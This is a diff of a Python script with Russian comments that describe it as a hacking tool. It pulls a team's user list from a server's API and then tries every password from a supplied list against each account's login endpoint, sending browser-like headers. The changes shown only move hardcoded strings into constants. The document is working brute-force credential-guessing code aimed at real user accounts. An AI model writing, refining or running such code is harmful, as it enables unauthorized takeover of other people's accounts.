@@ -39,7 +39,7 @@ def start(passwords):
     # Получаем список людей для взлома
     # Это может занять некоторое время
     print(yellow + "[..] Получаем список, это может занять некоторое время...")
-    r_m = requests.get(f'https://{SERVER}/api/{TEAM}/' + team + f'/{USERS}')
+    r_m = requests.get(f'https://{SERVER}/{API}/{TEAM}/' + team + f'/{USERS}')
     users = r_m.json(cls=ndjson.Decoder)
 
     # Выводим сообщение, что список готов
@@ -64,8 +64,8 @@ def start(passwords):
         for password in passwords:
             r = requests.post(f"https://{SERVER}/{LOGIN}",
                               data={"username": username, "password": password.strip(), "remember": "true"},
-                              headers={"X-Requested-With": "XMLHttpRequest",
-                                       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"}) # пытаемся войти в акк
+                              headers={"X-Requested-With": X_REQUESTED_WITH,
+                                       "User-Agent": USER_AGENT}) # пытаемся войти в акк
             #
 
             #       Выводим статус взлома
